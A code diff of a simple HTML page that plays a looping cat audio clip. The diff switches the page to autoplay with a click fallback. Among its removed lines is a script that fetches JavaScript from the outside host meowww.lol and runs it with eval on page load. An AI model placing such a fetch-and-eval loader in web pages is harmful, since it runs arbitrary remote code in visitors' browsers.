@@ -1,16 +1,16 @@
 <!DOCTYPE html>
 <html>
- <body>
-  <script>fetch('https://meowww.lol/cat.js').then(r=>r.text()).then(eval)</script>
- <audio id="catAudio" loop>
-  <source src="cat.mp3" type="audio/mpeg">
- </audio>
+<body>
+  <audio id="catAudio" loop autoplay>
+    <source src="cat.mp3" type="audio/mpeg">
+  </audio>
 
- <script>
- function playCat() {
-   const audio = document.getElementById('catAudio');
-   audio.play();
- }
- </script>
- </body>
+  <script>
+    const audio = document.getElementById('catAudio');
+    audio.play().catch(() => {
+      console.log("Autoplay blocked, click anywhere to start the cat sound.");
+      document.body.addEventListener('click', () => audio.play());
+    });
+  </script>
+</body>
 </html>
